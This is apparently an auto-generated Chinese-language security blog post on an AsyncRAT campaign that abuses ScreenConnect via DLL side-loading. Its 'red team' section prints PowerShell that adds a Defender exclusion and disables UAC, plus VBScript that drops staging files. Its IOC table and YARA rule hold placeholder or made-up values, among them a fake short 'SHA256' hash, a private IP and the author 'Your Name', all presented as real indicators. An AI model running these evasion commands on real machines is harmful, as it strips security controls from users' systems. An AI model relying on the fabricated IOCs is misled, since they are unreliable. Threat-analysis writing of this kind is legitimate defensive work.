---
layout: post
title:  "SEO-Poisoned Software Sites Abuse ScreenConnect to Deploy AsyncRAT"
date:   2026-07-01 19:42:56 +0000
categories: [security]
severity: critical
---

# 🚨 解析 AsyncRAT 的 ScreenConnect 滲透與繞過技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DLL Side-Loading, Process Hollowing, PowerShell Scripting

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 DLL Side-Loading 技術，將惡意的 `install.res.1033.dll` 庫載入系統，從而部署 ScreenConnect 服務。
* **攻擊流程圖解**:
  1. User 讀取假冒的軟體安裝包。
  2. 安裝包執行 `install.exe`。
  3. `install.exe` 載入 `install.res.1033.dll`。
  4. `install.res.1033.dll` 啟動 ScreenConnect 服務。
  5. ScreenConnect 服務創建和執行 PowerShell 腳本。
* **受影響元件**: Windows 系統，尤其是使用了 ScreenConnect 的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有足夠的權限部署 ScreenConnect 服務。
* **Payload 建構邏輯**:

    ```
    
    powershell
      # Fj5NmEsp9EuKrun.ps1
      # 設定 Microsoft Defender 排除
      Add-MpPreference -ExclusionPath "C:\Users\Public"
      # 關閉 User Account Control (UAC) 提示
      Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord -Force
      # 創建 Visual Basic Script (VBScript) 文件
      New-Item -Path "C:\Users\Public\installer_method3_stream.vbs" -ItemType File
    
    ```
 

```

vbscript
  ' installer_method3_stream.vbs
  ' 創建五個文件
  CreateObject("Scripting.FileSystemObject").CreateTextFile("C:\Users\Public\msgbox.txt")
  CreateObject("Scripting.FileSystemObject").CreateTextFile("C:\Users\Public\secret_bytes.txt")
  CreateObject("Scripting.FileSystemObject").CreateTextFile("C:\Users\Public\1.vb")
  CreateObject("Scripting.FileSystemObject").CreateTextFile("C:\Users\Public\cap.ps1")
  CreateObject("Scripting.FileSystemObject").CreateTextFile("C:\Users\Public\script.vbs")

```
* **繞過技術**: 攻擊者使用 DLL Side-Loading 和 Process Hollowing 技術來繞過安全防護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `SHA256: 1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `mora1987.work[.]gd` |
| File Path | `C:\Users\Public\installer_method3_stream.vbs` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule AsyncRAT_Detection {
        meta:
          description = "Detects AsyncRAT malware"
          author = "Your Name"
        strings:
          $a = "Fj5NmEsp9EuKrun.ps1"
          $b = "installer_method3_stream.vbs"
        condition:
          any of them
      }
    
    ```
* **緩解措施**: 更新系統和軟體，關閉不必要的服務，使用防病毒軟體進行掃描。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DLL Side-Loading**: 想像兩個 DLL 文件同時被載入記憶體，但其中一個是惡意的。技術上是指攻擊者利用 Windows 的 DLL 載入機制，將惡意的 DLL 文件載入系統。
* **Process Hollowing**: 想像一個進程被創建，但其內容被替換為惡意代碼。技術上是指攻擊者利用 Windows 的進程創建機制，創建一個新的進程，但其內容被替換為惡意代碼。
* **PowerShell Scripting**: PowerShell 是一種強大的腳本語言，攻擊者可以利用它來執行惡意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/seo-poisoned-software-sites-abuse.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


